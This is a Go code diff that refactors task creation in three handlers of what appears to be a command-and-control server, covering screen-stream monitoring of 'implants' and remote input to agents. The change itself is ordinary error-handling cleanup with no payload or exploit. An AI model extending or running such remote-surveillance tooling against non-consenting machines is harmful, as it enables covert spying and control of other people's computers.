@@ -725,10 +725,8 @@ func (s *Server) handleStartScreenMonitor(c *gin.Context) {
 	if mimeVal == "webp" || mimeVal == "jpeg" || mimeVal == "png" {
 		streamCmd += "," + mimeVal
 	}
-	task, err := s.createTask(id, "screen_stream_start", streamCmd, "", "", "", 0, 0, callerOpts(c)...)
-	if err != nil {
-		slog.Error("Screen monitor: failed to create task", "agent_id", id, "err", err)
-		respondError(c, http.StatusInternalServerError, "failed to create task")
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "screen_stream_start", Command: streamCmd})
+	if task == nil {
 		return
 	}
 	s.screenMonitorImplants[monitorKey] = time.Now()
@@ -773,10 +771,8 @@ func (s *Server) handleStopScreenMonitor(c *gin.Context) {
 		return
 	}
 
-	stopTask, err := s.createTask(id, "screen_stream_stop", "", "", "", "", 0, 0, callerOpts(c)...)
-	if err != nil {
-		slog.Error("Screen monitor stop: failed to create task", "agent_id", id, "err", err)
-		respondError(c, http.StatusInternalServerError, "failed to create stop task")
+	stopTask := s.issueAgentTask(c, id, TaskSpec{Type: "screen_stream_stop"})
+	if stopTask == nil {
 		return
 	}
 	delete(s.screenMonitorImplants, monitorKey)
@@ -897,10 +893,8 @@ func (s *Server) handleAgentRemoteInput(c *gin.Context) {
 		respondError(c, http.StatusInternalServerError, "failed to marshal request")
 		return
 	}
-	task, err := s.createTask(id, "remote_input", string(payload), "", "", "", 0, 0)
-	if err != nil {
-		slog.Error("Remote input: failed to create task", "agent_id", id, "err", err)
-		respondError(c, http.StatusInternalServerError, "failed to create task")
+	task := s.issueAgentTask(c, id, TaskSpec{Type: "remote_input", Command: string(payload)})
+	if task == nil {
 		return
 	}
 
